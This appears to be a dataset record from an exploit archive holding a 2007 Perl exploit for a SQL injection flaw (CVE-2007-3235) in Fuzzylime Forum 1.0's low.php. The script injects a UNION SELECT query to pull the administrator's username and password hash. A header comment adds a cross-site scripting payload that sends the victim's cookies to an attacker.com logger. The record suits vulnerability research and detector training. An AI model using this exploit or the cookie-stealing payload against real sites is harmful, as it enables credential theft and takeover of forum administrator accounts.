{
  "id": "4062",
  "title": "Fuzzylime Forum 1.0 - &#039;low.php?topic&#039; SQL Injection",
  "cve": "CVE-2007-3235",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n#################################################################################\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#\t\t   Fuzzylime Forum 1.0 SQL Injection Exploit\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Discovered by: Silentz\t\t\t\t\t\t\t#\r\n# Payload: Admin Username & Hash Retrieval\t\t\t\t\t#\r\n# Website: http://www.w4ck1ng.com\t\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Vulnerable Code (low.php): \t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#      $gettopicid = mysql_query(\"SELECT * FROM ${table_prefix}threads \t\t#\r\n#      WHERE threadid='$_GET[topic]'\");\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# PoC: http://victim.com/low.php?topic=' UNION SELECT 0,0,0,CONCAT(CHAR(58),\t#\r\n#      username,CHAR(58),password),0,0,0,0,0 FROM flforum_users WHERE \t\t#\r\n#      userid=1/*\t\t\t\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Subject To: magic_quotes_gpc set to off\t\t\t\t\t#\r\n# GoogleDork: Get your own!\t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Shoutz: The entire w4ck1ng community\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# NOTE: You can also grab the username & hash via a cookie logger and this XSS:\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#\thttp://victim.com/low.php?topic=\"><script>document.location=\t\t#\r\n#       \"http://attacker.com/logger.php?var=\"+document.cookie</script>\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#################################################################################\r\n\r\nuse LWP::UserAgent;\r\ndie \"Example: exploit.pl http://victim.com/\\n\" unless @ARGV;\r\n\r\n$b = LWP::UserAgent->new() or die \"Could not initialize browser\\n\";\r\n$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\r\n\r\n$host = $ARGV[0] . \"low.php?topic=' UNION SELECT 0,0,0,CONCAT(CHAR(58),username,CHAR(58),password),0,0,0,0,0 FROM flforum_users WHERE userid=1/*\";\r\n\r\n$res = $b->request(HTTP::Request->new(GET=>$host));\r\n$answer = $res->content;\r\n\r\nif ($answer =~ /raquo; :(.*?):/){\r\n\tprint \"\\nBrought to you by w4ck1ng.com...\\n\";\r\n\tprint \"\\n[+] Admin User : $1\";\r\n}\r\n\r\nif ($answer =~/([0-9a-fA-F]{32})/){print \"\\n[+] Admin Hash : $1\\n\";}\r\n\r\nelse{print \"\\n[-] Exploit Failed...\\n\";}\r\n\r\n# milw0rm.com [2007-06-12]",
  "url": "https://www.exploit-db.com/exploits/4062"
}